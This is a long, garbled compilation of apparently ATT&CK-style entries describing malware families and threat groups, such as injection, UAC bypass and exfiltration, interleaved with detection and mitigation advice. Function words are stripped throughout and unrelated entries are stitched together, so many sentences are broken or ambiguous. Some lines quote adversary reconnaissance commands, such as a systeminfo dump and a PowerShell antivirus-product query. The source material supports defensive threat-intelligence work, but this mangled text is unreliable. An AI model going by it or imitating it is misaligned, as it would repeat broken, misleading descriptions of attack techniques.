[IcedID](https://attack.mitre.org/software/S0483) called <code>ZwWriteVirtualMemory</code>, <code>ZwProtectVirtualMemory</code>, <code>ZwQueueApcThread</code>, <code>NtResumeThread</code> inject remote process.(Citation: Juniper IcedID June 2020) [Impacket](https://attack.mitre.org/software/S0357)'s wmiexec module execute commands WMI.(Citation: Impacket Tools) [jRAT](https://attack.mitre.org/software/S0283) payloads packed.(Citation: Kaspersky Adwind Feb 2016) [PcShare](https://attack.mitre.org/software/S1050) `rundll32.exe` execution.(Citation: Bitdefender FunnyDream Campaign November 2020) 
[Lokibot](https://attack.mitre.org/software/S0447) utilized multiple techniques bypass UAC.(Citation: Talos Lokibot Jan 2021) [Crimson](https://attack.mitre.org/software/S0115) command collect exfiltrate emails Outlook.(Citation: Proofpoint Operation Transparent Tribe March 2016) Monitor DNS traffic to/from known-bad suspicious domains analyze traffic flows follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [APT41](https://attack.mitre.org/groups/G0096) created RAR archive targeted files exfiltration.(Citation: FireEye APT41 Aug 2019) (Citation: FireEye APT28 Hospitality Aug 2017)(Citation: District Court Indictment GRU Oct 2018)  [Windshift](https://attack.mitre.org/groups/G0112) revoked certificates sign malware.(Citation: objective-see windtail1 dec 2018)(Citation: SANS Windshift August 2018) [POWERSOURCE](https://attack.mitre.org/software/S0145) PowerShell backdoor.(Citation: FireEye FIN7 March 2017)(Citation: Cisco DNSMessenger March 2017) [Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) UEFI BIOS rootkit developed company Hacking Team persist remote access software targeted systems.(Citation: TrendMicro Hacking Team UEFI) [LazyScripter](https://attack.mitre.org/groups/G0140) variety open-source remote access Trojans operations.(Citation: MalwareBytes LazyScripter Feb 2021) [Kobalos](https://attack.mitre.org/software/S0641) triggered incoming TCP connection legitimate service specific source port.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)  [Indrik Spider](https://attack.mitre.org/groups/G0119) Policy Objects deploy batch scripts.(Citation: Crowdstrike Indrik November 2018) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [KillDisk](https://attack.mitre.org/software/S0607) VMProtect reverse engineering malware difficult.(Citation: Trend Micro KillDisk 1) [Zebrocy](https://attack.mitre.org/software/S0251)'s Delphi variant packed UPX.(Citation: Unit42 Sofacy Dec 2018)(Citation: Accenture SNAKEMACKEREL Nov 2018) Strings [Attor](https://attack.mitre.org/software/S0438)'s components encrypted XOR cipher, hardcoded key configuration data, log files plugins encrypted hybrid encryption scheme Blowfish-OFB combined RSA.(Citation: ESET Attor Oct 2019) Adversaries binaries locations executed weakness. Identify block malicious software executed path interception application control tools, Windows Defender Application Control, AppLocker, Software Restriction Policies appropriate.(Citation: SANS Application Whitelisting)(Citation: Windows Defender Application Control)(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker)(Citation: Application Lockdown)(Citation: Software Restriction ) [Bisonal](https://attack.mitre.org/software/S0268) C2 communications.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020) [H1N1](https://attack.mitre.org/software/S0132) bypasses user access control DLL hijacking vulnerability Windows Update Standalone Installer (wusa.exe).(Citation: Cisco H1N1 2) [Elderwood](https://attack.mitre.org/groups/G0066) leveraged multiple types spearphishing attempt user links.(Citation: Symantec Elderwood Sept 2012)(Citation: CSM Elderwood Sept 2012) [GALLIUM](https://attack.mitre.org/groups/G0093) [PsExec](https://attack.mitre.org/software/S0029) laterally hosts target network.(Citation: GALLIUM December 2019) [njRAT](https://attack.mitre.org/software/S0385) module performing remote desktop access.(Citation: Fidelis njRAT June 2013) [CopyKittens](https://attack.mitre.org/groups/G0052) rundll32 load tools victims, including lateral movement tool named Vminst, Cobalt Strike, shellcode.(Citation: ClearSky Wilted Tulip July 2017) [VaporRage](https://attack.mitre.org/software/S0636) ability download malicious shellcode compromised systems.(Citation: MSTIC Nobelium Toolset 2021) [Pillowmint](https://attack.mitre.org/software/S0517) iterate running processes collecting list processes capture later.(Citation: Trustwave Pillowmint June 2020)	 [Lazarus Group](https://attack.mitre.org/groups/G0032) LinkedIn identify target specific employees chosen organization.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020) [GravityRAT](https://attack.mitre.org/software/S0237) port 46769 C2.(Citation: Talos GravityRAT) [APT41](https://attack.mitre.org/groups/G0096) rundll32.exe execute loader.(Citation: Crowdstrike GTR2020 Mar 2020) [ServHelper](https://attack.mitre.org/software/S0382) ability execute PowerShell script infected host.(Citation: Trend Micro TA505 June 2019) [ObliqueRAT](https://attack.mitre.org/software/S0644) ability recursively enumerate files infected endpoint.(Citation: Talos Oblique RAT March 2021) Audit domain local accounts permission levels routinely situations adversary gain wide access obtaining credentials privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Privilege) audits include default accounts enabled, local accounts created authorized. Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: Securing Privileged Access) Monitor newly constructed network connections received untrusted hosts.  Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor contextual data malicious payload, compilation times, file hashes, watermarks identifiable configuration information. activity visibility target organization, detection behavior difficult. Detection efforts focused post-compromise phases adversary lifecycle. (Citation: NCSC Joint Report Public Tools) [RCSession](https://attack.mitre.org/software/S0662) gather owner information, including user administrator privileges.(Citation: Profero APT27 December 2020) [SUGARDUMP](https://attack.mitre.org/software/S1042) created scheduled tasks called `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` `MicrosoftEdgeCrashRepoeterTaskMachineUA`, configured execute `CrashReporter.exe` user logon.(Citation: Mandiant UNC3890 Aug 2022) Detection challenging messages forwarded auto-forwarding rule presentation manually forwarded message. user aware addition auto-forwarding rule suspect account compromised; email-forwarding rules affect normal usage patterns operations email account. true hidden auto-forwarding rules. reliably detect existence hidden auto-forwarding rule examining message tracking logs MAPI editor notice modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)
Auto-forwarded messages specific detectable artifacts header; artifacts platform-specific. Examples include X-MS-Exchange-Organization-AutoForwarded set true, X-MailFwdBy X-Forwarded-To. forwardingSMTPAddress parameter forwarding process managed administrators user actions. messages mailbox forwarded SMTP address. However, typical client-side rules, message forwarded mailbox; appears destination mailbox.(Citation: Tim McMichael Exchange Mail Forwarding 2) volumes emails bear X-MS-Exchange-Organization-AutoForwarded header (indicating auto-forwarding) emails match appearance forwarded message investigation administrator level user-level. [LoudMiner](https://attack.mitre.org/software/S0451) script gather IP address infected machine sending C2.(Citation: ESET LoudMiner June 2019) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors [Conti](https://attack.mitre.org/software/S0575) ransomware encrypt compromised network.(Citation: DFIR Conti Bazar Nov 2021) [KGH_SPY](https://attack.mitre.org/software/S0526) ability set <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key execute logon scripts.(Citation: Cybereason Kimsuky November 2020) [RogueRobin](https://attack.mitre.org/software/S0270) Windows Script Components.(Citation: Unit42 DarkHydrus Jan 2019)(Citation: Unit 42 DarkHydrus July 2018) (Citation: Dell Lateral Movement) general, detecting usage fast flux DNS difficult traffic load balancing services client requests quickly. single flux IP addresses change static domain names. double flux cases, static. Defenders domain registrars service providers position detection. [Trojan.Mebromi](https://attack.mitre.org/software/S0001) performs BIOS modification download execute file protect removal.(Citation: 2011) Monitor authentication logs application login failures [Valid Accounts](https://attack.mitre.org/techniques/T1078). authentication failures high, brute force attempt gain access legitimate credentials. [SysUpdate](https://attack.mitre.org/software/S0663) determine 32 bit 64 bit architecture.(Citation: Trend Micro Iron Tiger April 2021) [Bandook](https://attack.mitre.org/software/S0234) support commands execute Java-based payloads.(Citation: CheckPoint Bandook Nov 2020)  Monitor API calls polling intercept keystrokes. Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [APT29](https://attack.mitre.org/groups/G0016) steganography hide C2 communications images.(Citation: ESET Dukes October 2019) [Ursnif](https://attack.mitre.org/software/S0386) registered service Registry automatic execution startup.(Citation: TrendMicro PE_URSNIF.A2) [Egregor](https://attack.mitre.org/software/S0554) multiple anti-analysis anti-sandbox techniques prevent automated analysis sandboxes.(Citation: Cyble Egregor Oct 2020)(Citation: NHS Digital Egregor Nov 2020)  [Indrik Spider](https://attack.mitre.org/groups/G0119) WMIC execute commands remote computers.(Citation: Symantec WastedLocker June 2020)  [NavRAT](https://attack.mitre.org/software/S0247) <code>systeminfo</code> victim’s machine.(Citation: Talos NavRAT 2018) [Nebulae](https://attack.mitre.org/software/S0630) ability delete files directories.(Citation: Bitdefender Naikon April 2021) [Kivars](https://attack.mitre.org/software/S0437) ability capture screenshots infected host.(Citation: TrendMicro BlackTech June 2017) [MacMa](https://attack.mitre.org/software/S1016) exfiltrates data supplied path C2 channel.(Citation: ESET DazzleSpy Jan 2022) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor processes arguments malicious attempts modify trust settings, installation root certificates modifications trust attributes/policies applied files. [Tropic Trooper](https://attack.mitre.org/groups/G0081) hidden payloads Flash directories fake installer files.(Citation: TrendMicro Tropic Trooper 2020) Monitor status services involved recovery. [NETWIRE](https://attack.mitre.org/software/S0198) ability compress archived screenshots.(Citation: Red Canary NETWIRE January 2020) [OSX/Shlayer](https://attack.mitre.org/software/S0402) base64-decode AES-decrypt downloaded payloads.(Citation: Carbon Black Shlayer Feb 2019) Versions [OSX/Shlayer](https://attack.mitre.org/software/S0402) pass encrypted password-protected code <code>openssl</code> write payload <code>/tmp</code> folder.(Citation: sentinelone shlayer zshlayer)(Citation: 20 macOS Common Tools Techniques) [PcShare](https://attack.mitre.org/software/S1050) decrypted strings applying XOR operation decompression custom implemented LZM algorithm.(Citation: Bitdefender FunnyDream Campaign November 2020) [ROKRAT](https://attack.mitre.org/software/S0240) encrypt data prior exfiltration RSA public key.(Citation: Volexity InkySquid RokRAT August 2021)(Citation: Malwarebytes RokRAT VBA January 2021) [IceApple](https://attack.mitre.org/software/S1022) encrypt compress files Gzip prior exfiltration.(Citation: CrowdStrike IceApple 2022) [Turla](https://attack.mitre.org/groups/G0010) <code>net user</code> enumerate local accounts system.(Citation: ESET ComRAT 2020)(Citation: ESET Crutch December 2020) [SPACESHIP](https://attack.mitre.org/software/S0035) achieves persistence creating shortcut current user's Startup folder.(Citation: FireEye APT30) [SeaDuke](https://attack.mitre.org/software/S0053) packed UPX packer.(Citation: Unit 42 SeaDuke 2015) [Fox Kitten](https://attack.mitre.org/groups/G0117) accessed ntuser.dat UserClass.dat compromised hosts.(Citation: CISA AA20-259A Iran-Based Actor September 2020) Monitor environment variables files loading shared libraries as LD_PRELOAD on Linux and DYLD_INSERT_LIBRARIES macOS. Monitor executed commands arguments bypass security restrictions limit command-line interpreters.  [ShadowPad](https://attack.mitre.org/software/S0596) data C2 8 hours.(Citation: Securelist ShadowPad Aug 2017) Monitor third-party application logging, messaging, artifacts abuse Outlook's feature persistence compromised system. SensePost, tool [Ruler](https://attack.mitre.org/software/S0358) carry malicious rules, forms, attacks, released tool detect Ruler usage.(Citation: SensePost NotRuler) Restrict software installation trusted repositories cautious orphaned software packages. Enable advanced auditing FS. Check success failure audit options FS Management snap-in. Enable Audit Application Generated events FS farm Policy Object.(Citation: FireEye ADFS) [Rising Sun](https://attack.mitre.org/software/S0448) enumerate running processes process infected machine.(Citation: McAfee Sharpshooter December 2018)	 [Sandworm Team](https://attack.mitre.org/groups/G0034) webshells including [P.A.S. Webshell](https://attack.mitre.org/software/S0598) maintain access victim networks.(Citation: ANSSI Sandworm January 2021) [Xbash](https://attack.mitre.org/software/S0341) scripts invoke PowerShell download malicious executable DLL execution.(Citation: Unit42 Xbash Sept 2018) [Axiom](https://attack.mitre.org/groups/G0001) compromised administrative accounts escalate privileges.(Citation: Novetta-Axiom) [Emissary](https://attack.mitre.org/software/S0082) capability execute <code>gpresult</code>.(Citation: Emissary Trojan Feb 2016) [Metamorfo](https://attack.mitre.org/software/S0455) collected hostname operating version compromised host.(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020)(Citation: ESET Casbaneiro Oct 2019) [HiddenWasp](https://attack.mitre.org/software/S0394) rootkit hook implement functions system.(Citation: Intezer HiddenWasp Map 2019) [CostaBricks](https://attack.mitre.org/software/S0614) entire unobfuscated code legitimate source application Blink code.(Citation: BlackBerry CostaRicto November 2020) Monitor newly constructed network connections search network shares computers compromised files [TA459](https://attack.mitre.org/groups/G0062) exploited Word vulnerability CVE-2017-0199 execution.(Citation: Proofpoint TA459 April 2017) [FELIXROOT](https://attack.mitre.org/software/S0267) WMI query Windows Registry.(Citation: ESET GreyEnergy Oct 2018) Disable RDP service unnecessary. (Citation: Kaspersky Carbanak) [Magic Hound](https://attack.mitre.org/groups/G0059) dllhost.exe mask malicious tool C2.(Citation: DFIR Report APT35 ProxyShell March 2022) [Machete](https://attack.mitre.org/software/S0409) saves window names.(Citation: ESET Machete July 2019)  [Shamoon](https://attack.mitre.org/software/S0140) attempts remote machines network.(Citation: Palo Alto Shamoon Nov 2016) (Citation: Cylance Shaheen Nov 2018) [APT3](https://attack.mitre.org/groups/G0022) leverages valid accounts gaining credentials victim domain.(Citation: Symantec Buckeye) (Citation: ESET BackdoorDiplomacy Jun 2021) [ObliqueRAT](https://attack.mitre.org/software/S0644) hide payload BMP images hosted compromised websites.(Citation: Talos Oblique RAT March 2021) [Gazer](https://attack.mitre.org/software/S0168) injects communication module Internet accessible process performs C2.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) Monitor attributes settings, certificate template modifications (ex: EID 4899/4900 malicious certificate enrolled).(Citation: SpecterOps Certified Pre Owned) Monitor newly executed processes attempt detailed operating hardware, including version, patches, hotfixes, service packs, architecture. [Valak](https://attack.mitre.org/software/S0476) ability exfiltrate data C2 channel.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020) [StrifeWater](https://attack.mitre.org/software/S1034) modify sleep time responses default 20-22 seconds.(Citation: Cybereason StrifeWater Feb 2022)  Monitor failed authentication attempts accounts result password spraying attempts. difficult detect hashes cracked, scope target network. (ex: Windows EID 4625 5379) [PlugX](https://attack.mitre.org/software/S0013) module enumerating TCP UDP network connections processes <code>netstat</code> command.(Citation: CIRCL PlugX March 2013) [PowerShower](https://attack.mitre.org/software/S0441) PowerShell document stealer module pack exfiltrate .txt, .pdf, .xls .doc files 5MB modified days.(Citation: Kaspersky Cloud Atlas August 2019) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) Microsoft’s TechNet portal dead drop resolver encoded tag IP address command control server.(Citation: FireEye APT17)(Citation: FireEye Periscope March 2018) [REvil](https://attack.mitre.org/software/S0496) encrypted strings configuration files.(Citation: Data Sodinokibi June 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: IB Ransomware 2020)(Citation: Picus Sodinokibi January 2020)(Citation: Secureworks REvil September 2019) [PowerLess](https://attack.mitre.org/software/S1012) encrypt browser database files prior exfiltration.(Citation: Cybereason PowerLess February 2022) (Citation: TrendMicro EarthLusca 2022) Monitor unexpected network shares accessed target systems systems. Detection Endpoint DoS achieved sufficient impact availability service, response time typically requires aggressive monitoring responsiveness. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) [TeamTNT](https://attack.mitre.org/groups/G0139) scanned specific lists target IP addresses.(Citation: Trend Micro TeamTNT) Monitor anomalous activity, enabling Audit Kerberos Service Ticket Operations log Kerberos TGS service ticket requests. investigate irregular patterns activity (ex: accounts numerous requests, Event 4768 4769, time frame, request RC4 encryption [Type 0x17], pre-authentication required [Type: 0x0]). [MegaCortex](https://attack.mitre.org/software/S0576) open-source library, Mbed Crypto, generated AES carry file encryption process.(Citation: IBM MegaCortex)(Citation: mbed-crypto) (Citation: Unit 42 BackConfig 2020) (Citation: ESET BackdoorDiplomacy Jun 2021) [APT39](https://attack.mitre.org/groups/G0087) Smartftp Password Decryptor tool decrypt FTP passwords.(Citation: BitDefender Chafer 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) exploited CVE-2017-0199 Word execute code.(Citation: Crowdstrike MUSTANG PANDA June 2018) [SUPERNOVA](https://attack.mitre.org/software/S0578) masqueraded legitimate SolarWinds DLL.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020) [Ursnif](https://attack.mitre.org/software/S0386) droppers PowerShell download cradles download execute malware's executable payload.(Citation: Bromium Ursnif Mar 2017) (Citation: Trend Micro DRBControl February 2020) [Cyclops Blink](https://attack.mitre.org/software/S0687) enumerate process running under.(Citation: NCSC Cyclops Blink February 2022) Enforce principle least-privilege. implementing access control mechanisms include authentication authorization. [FIN10](https://attack.mitre.org/groups/G0051) established persistence S4U tasks Scheduled Task option PowerShell Empire.(Citation: FireEye FIN10 June 2017)(Citation: Github PowerShell Empire) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) Windows Registry modifications DLL payload.(Citation: RedCanary Mockingbird 2020)	 (Citation: FireEye APT35 2018) [Fox Kitten](https://attack.mitre.org/groups/G0117) Softerra LDAP browser browse documentation service accounts.(Citation: CISA AA20-259A Iran-Based Actor September 2020) domain administrator root accounts day-to-day operations expose potential adversaries unprivileged systems. [Clambling](https://attack.mitre.org/software/S0660) discover hostname, name, Windows version targeted machine.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [Cobalt Group](https://attack.mitre.org/groups/G0080) bypassed UAC.(Citation: IB Cobalt Aug 2017) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors custom VM-based payload loader named [CostaBricks](https://attack.mitre.org/software/S0614).(Citation: BlackBerry CostaRicto November 2020) Audit logging <code>launchd</code> events MacOS reviewed centrally collected multiple options, syslog, OpenBSM, OSquery. [APT33](https://attack.mitre.org/groups/G0064) password spraying gain access target systems.(Citation: FireEye APT33 Guardrail)(Citation: Holmium June 2020) [SUGARUSH](https://attack.mitre.org/software/S1049) created service named `Service1` persistence.(Citation: Mandiant UNC3890 Aug 2022) [FlawedAmmyy](https://attack.mitre.org/software/S0381) `rundll32` execution.(Citation: Korean FSI TA505 2020) [Janicab](https://attack.mitre.org/software/S0163) captured audio C2 server.(Citation: f-secure janicab)(Citation: Janicab) [Whitefly](https://attack.mitre.org/groups/G0107) tools [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Symantec Whitefly March 2019) Collect analyze Registry associate file extensions default applications execution correlate unknown process launch activity unusual file types process. User file association preferences stored <code> [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts</code> override associations configured <code>[HKEY_CLASSES_ROOT]</code>. user's preference occur entry's subkeys. [FELIXROOT](https://attack.mitre.org/software/S0267) gathers time zone victim’s machine.(Citation: ESET GreyEnergy Oct 2018) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors collected name, OS, `cmd /c systeminfo > %temp%\ temp.ini`.(Citation: McAfee Honeybee) [Forfiles](https://attack.mitre.org/software/S0193) subvert controls conceal command execution invoking [cmd](https://attack.mitre.org/software/S0106).(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017) [SombRAT](https://attack.mitre.org/software/S0615) encrypted collected data AES-256 hardcoded key.(Citation: BlackBerry CostaRicto November 2020) [Chimera](https://attack.mitre.org/groups/G0114) encapsulated [Cobalt Strike](https://attack.mitre.org/software/S0154)'s C2 protocol DNS HTTPS.(Citation: NCC Chimera January 2021) [UNC2452](https://attack.mitre.org/groups/G0118) <code>netsh</code> configure firewall rules limited UDP outbound packets.(Citation: Deep Dive Solorigate January 2021) Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) [Evilnum](https://attack.mitre.org/groups/G0120) collect email credentials victims.(Citation: ESET EvilNum July 2020) [StrifeWater](https://attack.mitre.org/software/S1034) send data files compromised host C2 server.(Citation: Cybereason StrifeWater Feb 2022) [Machete](https://attack.mitre.org/software/S0409)'s collected data encrypted AES exfiltration.(Citation: ESET Machete July 2019)  [Agent.btz](https://attack.mitre.org/software/S0092) creates file named thumb.dd USB flash drives connected victim. file infected activity logs.(Citation: Securelist Agent.btz) [Moses Staff](https://attack.mitre.org/groups/G1009) built malware, [DCSrv](https://attack.mitre.org/software/S1033) [PyDCrypt](https://attack.mitre.org/software/S1032), targeting victims' machines.(Citation: Checkpoint MosesStaff Nov 2021) Routinely check user permissions ensure expected users ability list IAM identities discover cloud accounts. [Bumblebee](https://attack.mitre.org/software/S1039) multiple Native APIs.(Citation: Proofpoint Bumblebee April 2022)(Citation: Medium Ali Salem Bumblebee April 2022) [Mofang](https://attack.mitre.org/groups/G0103) compressed [ShimRat](https://attack.mitre.org/software/S0444) executable malicious email attachments. [Mofang](https://attack.mitre.org/groups/G0103) encrypted payloads downloaded victims.(Citation: FOX-IT 2016 Mofang) [PLATINUM](https://attack.mitre.org/groups/G0068) keyloggers.(Citation: PLATINUM April 2016) [Grandoreiro](https://attack.mitre.org/software/S0531) detect VMWare I/O port Virtual PC <code>vpcext</code> instruction.(Citation: ESET Grandoreiro April 2020) [Stuxnet](https://attack.mitre.org/software/S0603) enumerates user accounts domain.(Citation: Symantec W.32 Stuxnet Dossier) [Sliver](https://attack.mitre.org/software/S0633) ability gather network configuration information.(Citation: GitHub Sliver Ifconfig) [Remsec](https://attack.mitre.org/software/S0125) add remove applications ports Windows firewall disable entirely.(Citation: Kaspersky ProjectSauron Technical Analysis) [TeamTNT](https://attack.mitre.org/groups/G0139) <code>curl</code> <code>wget</code> commands batch scripts download tools.(Citation: Intezer TeamTNT September 2020)(Citation: Cisco Talos Intelligence Group) Variants [Anchor](https://attack.mitre.org/software/S0504) DNS tunneling communicate C2.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020) [Cyclops Blink](https://attack.mitre.org/software/S0687) Linux API `if_nameindex` gather network interface names.(Citation: NCSC Cyclops Blink February 2022)(Citation: Trend Micro Cyclops Blink March 2022) [Patchwork](https://attack.mitre.org/groups/G0040) collected victim username running admin, C2 server.(Citation: Cymmetria Patchwork)(Citation: TrendMicro Patchwork Dec 2017) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) scrambles encrypts data AES256 sending C2 server.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020) variant [PLAINTEE](https://attack.mitre.org/software/S0254) performs UAC bypass.(Citation: Rancor Unit42 June 2018) [TA505](https://attack.mitre.org/groups/G0092) decrypted packed DLLs XOR key.(Citation: NCC TA505) [ROKRAT](https://attack.mitre.org/software/S0240) check VMware-related files DLLs sandboxes.(Citation: Talos Group123)(Citation: NCCGroup RokRat Nov 2018)(Citation: Malwarebytes RokRAT VBA January 2021) [Kazuar](https://attack.mitre.org/software/S0265) gathers local drives.(Citation: Unit 42 Kazuar 2017) [APT29](https://attack.mitre.org/groups/G0016) compromised identities access networks SSH,  VPNs, remote access tools.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: NCSC APT29 July 2020)(Citation: CrowdStrike StellarParticle January 2022) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. removing mavinject.exe App-V environment. [Sliver](https://attack.mitre.org/software/S0633) screenshots victim’s active display.(Citation: GitHub Sliver Screen) Mitigation variants technique achieved stateful firewalls, depending implemented.  Monitor failed authentication attempts accounts result password spraying attempts. difficult detect hashes cracked, scope target network. (ex: Windows EID 4625 5379) (Citation: Crowdstrike Indrik November 2018) [Donut](https://attack.mitre.org/software/S0695) generate shellcode outputs execute JavaScript JScript.(Citation: Donut Github)	 [Peirates](https://attack.mitre.org/software/S0683) query Kubernetes API secrets.(Citation: Peirates GitHub) [Turla](https://attack.mitre.org/groups/G0010) spearphishing link users download malware.(Citation: ESET Turla Mosquito Jan 2018) [BBSRAT](https://attack.mitre.org/software/S0127) list file directory information.(Citation: Palo Alto Networks BBSRAT) [CookieMiner](https://attack.mitre.org/software/S0492) Google Chrome's decryption extraction operations.(Citation: Unit42 CookieMiner Jan 2019) Monitor newly executed processes abuse services daemons execute commands programs. [Ke3chang](https://attack.mitre.org/groups/G0004) tool RemoteExec (similar [PsExec](https://attack.mitre.org/software/S0029)) remotely execute batch scripts binaries.(Citation: NCC APT15 Alive Strong) [Kimsuky](https://attack.mitre.org/groups/G0094) checked presence antivirus software <code>powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct</code>.(Citation: KISA Operation Muzabi) developer utilities blocked restricted required. Periodically baseline registered SIPs trust providers (Registry entries files disk), new, modified, non-Microsoft entries.(Citation: SpectorOps Subverting Trust Sept 2017) analyze Autoruns data oddities anomalies, malicious files attempting persistent execution hiding auto-starting locations. Autoruns hide entries signed Windows default, ensure “Hide Entries” “Hide Windows Entries” deselected.(Citation: SpectorOps Subverting Trust Sept 2017)

On macOS, removal the <code>com.apple.quarantine</code> flag user operating suspicious action examined further. monitor software update frameworks strip this flag performing updates. possible, store separate cryptographic hardware local system.  [Cobalt Group](https://attack.mitre.org/groups/G0080) msxsl.exe bypass AppLocker invoke Jscript code XSL file.(Citation: Talos Cobalt July 2018) [PoshC2](https://attack.mitre.org/software/S0378) implementation [Mimikatz](https://attack.mitre.org/software/S0002) gather credentials memory.(Citation: GitHub PoshC2) [Flagpro](https://attack.mitre.org/software/S0696) execute <code>net view</code> targeted system.(Citation: NTT Security Flagpro December 2021)  [SynAck](https://attack.mitre.org/software/S0242) encrypts victims machine victim pay ransom. (Citation: SecureList SynAck Doppelgänging 2018) [WhisperGate](https://attack.mitre.org/software/S0689) enumerate connected remote logical drives.(Citation: Cisco Ukraine Wipers January 2022) Disable remote service (ex: SSH, RDP, etc.) unnecessary. [Neoichor](https://attack.mitre.org/software/S0691) ability configure browser settings modifying Registry entries `HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer`.(Citation: NICKEL December 2021) [GoldenSpy](https://attack.mitre.org/software/S0493)'s uninstaller delete registry entries, files folders, finally tasks completed.(Citation: Trustwave GoldenSpy2 June 2020) [BADNEWS](https://attack.mitre.org/software/S0128) installs registry key establish persistence.(Citation: Forcepoint Monsoon) [LookBack](https://attack.mitre.org/software/S0582) modified version RC4 data transfer.(Citation: Proofpoint LookBack Malware Aug 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware IndiaIndia saves gathered victim file compressed Zlib, encrypted, uploaded C2 server.(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018) [BlackTech](https://attack.mitre.org/groups/G0098) right-to-left-override obfuscate filenames malicious e-mail attachments.(Citation: TrendMicro BlackTech June 2017) [DarkWatchman](https://attack.mitre.org/software/S0673) `cmd.exe` execute commands.(Citation: Prevailion DarkWatchman 2021) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) encryption base64 encoding hide strings enforce access control deployed.(Citation: ANSSI Sandworm January 2021) strings [HOMEFRY](https://attack.mitre.org/software/S0232) obfuscated XOR x56.(Citation: FireEye Periscope March 2018) [Ke3chang](https://attack.mitre.org/groups/G0004) gathered files local directories exfiltration.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NICKEL December 2021) exfiltration, [Okrum](https://attack.mitre.org/software/S0439)'s backdoor hidden files store logs outputs backdoor commands.(Citation: ESET Okrum July 2019) [SideTwist](https://attack.mitre.org/software/S0610) POST requests port 443 C2.(Citation: Check APT34 April 2021) Monitor local image registry malicious images added. Monitor newly constructed drives events hardware accessories (especially unknown) connected systems. Endpoint sensors detect addition hardware USB, Thunderbolt, external device communication ports. [Fysbis](https://attack.mitre.org/software/S0410) established persistence systemd service.(Citation: Fysbis Dr Analysis) [LOWBALL](https://attack.mitre.org/software/S0042) Dropbox cloud storage service command control.(Citation: FireEye admin@338) [Skidmap](https://attack.mitre.org/software/S0468) monitored critical processes ensure resiliency.(Citation: Trend Micro Skidmap)  [Emissary](https://attack.mitre.org/software/S0082) capability execute command <code>net localgroup administrators</code>.(Citation: Emissary Trojan Feb 2016) [Aquatic Panda](https://attack.mitre.org/groups/G0143) attempted failed Bash commands Windows host passing <code>cmd /C</code>.(Citation: CrowdStrike AQUATIC PANDA December 2021) [EvilBunny](https://attack.mitre.org/software/S0396) integrated scripting engine download execute Lua scripts.(Citation: Cyphort EvilBunny Dec 2014) [Dok](https://attack.mitre.org/software/S0281) users execute permissions application command <code>chmod +x /Users/Shared/AppStore.app</code>.(Citation: CheckPoint Dok) Monitor executed commands arguments delete alter malicious network configuration settings generated artifacts host system, including logs files <code>Default.rdp</code> <code>/var/log/</code>.  [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) incorporated code tools attempts terminate anti-virus processes.(Citation: Trend Micro Tick November 2019) [FIN4](https://attack.mitre.org/groups/G0085) captured credentials fake Outlook App (OWA) login .NET based keylogger.(Citation: 